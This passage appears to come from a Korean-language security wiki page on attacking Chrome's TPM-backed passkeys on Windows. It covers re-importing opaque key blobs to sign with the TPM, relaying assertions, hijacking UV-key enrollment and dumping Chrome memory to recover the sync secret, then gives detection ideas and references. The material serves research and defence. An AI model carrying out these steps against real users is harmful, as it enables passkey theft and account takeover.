브라우저가 TPM-backed identity key를 **`NCRYPT_OPAQUE_KEY_BLOB`**으로 내보내고 해당 blob을 사용자가 접근할 수 있는 상태에 저장한다면, malware는 raw private key를 추출할 필요가 없습니다. 같은 머신에서 blob을 다시 가져온 뒤 로컬 TPM에 공격자가 제어하는 데이터의 서명을 요청하면 됩니다:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

이는 **hardware binding이 기기 외부로의 내보내기는 막지만, 침해된 endpoint에서 동일 사용자가 사용하는 것은 막지 못한다**는 뜻입니다.

### 실제 악용 경로

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome의 LevelDB에서 `WebauthnCredentialSpecifics`를 열거합니다.
   - passkey 로그인을 시작하고 새로운 WebAuthn challenge를 가져옵니다.
   - 피해자 TPM에서 탈취한 `wrapped_identity_private_key` blob을 사용해 cloud-authenticator 요청 바인딩에 서명합니다.
   - 반환된 assertion을 relying party에 relay합니다.
   - RP가 `userVerification=preferred`를 허용하거나 **`UV=0`**인 assertion을 거부하지 않는 경우 특히 유용합니다.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state`를 삭제하거나 유효한 서명의 `device/forget` 작업을 전송해 재온보딩을 강제합니다.
   - 온보딩 후 기기가 **`uv_key_pending`** 상태로 남으면 공격자가 제어하는 UV public key를 등록합니다.
   - 제공업체가 새 UV key의 attestation / secure-hardware 출처를 확인하지 않으면 이후 공격자 key의 서명이 **`UV=1`**로 취급됩니다.
3. **Master-secret / SDS 복구 정보 탈취**<sup>[[4]](#references)</sup>
   - 복구 또는 재가입을 강제해 Chrome이 동기화된 passkey master secret을 가져오도록 합니다.
   - `passkey_enclave_state`의 재생성/수정을 감시한 다음, 평문 **security domain secret (SDS)**이 메모리에 있는 동안 Chrome 메모리를 dump합니다.
   - 복구한 SDS를 사용해 모든 `WebauthnCredentialSpecifics` 레코드의 암호화된 필드를 복호화하고, 이동 가능한 WebAuthn private key를 복구합니다.

### DFIR / 탐지 아이디어

- `passkey_enclave_state`의 **삭제/재생성**을 모니터링합니다.<sup>[[4]](#references)</sup>
- 브라우저가 아닌 프로세스가 Chrome **`Sync Data\LevelDB`**에 비정상적으로 접근하면 alert를 발생시킵니다.
- **Chrome 메모리 dump** 또는 의심스러운 프로세스 간 메모리 접근을 탐지합니다.
- 반복적인 **Google Password Manager recovery PIN** 요청이나 예상치 못한 재온보딩을 조사합니다.
- 동기화된 passkey에서는 WebAuthn **`signCount`**가 일정하게 유지되는 경우가 많아 유용하지 않을 수 있으므로, 일반적인 clone 탐지는 효과가 약하다는 점을 기억하세요.

## References

- [1] [Unit 42 – 고가치 분야를 표적으로 삼은 수년간의 미탐지 작전 조사](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP를 통한 Word VBA 매크로 피싱 → hMailServer 자격 증명 복호화 → Veeam CVE-2023-27532를 이용해 SYSTEM 권한 획득](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon 내부: 은밀한 공격 작전의 relay 네트워크와 내부 동작 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: 비밀번호 없는 인증의 새로운 공격 표면](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key 저장소](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows 해킹: Microsoft 시스템 및 네트워크 공격](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory 데이터 저장소의 실제 작동 방식: NTDS.dit 내부 (1부)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - 원격 Lsass 덤프 비밀번호](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still Toolkit으로 사이버 스파이 활동 도구 확장](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW 함수 및 `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` 백업 모드](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – 활성 세션 종료](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
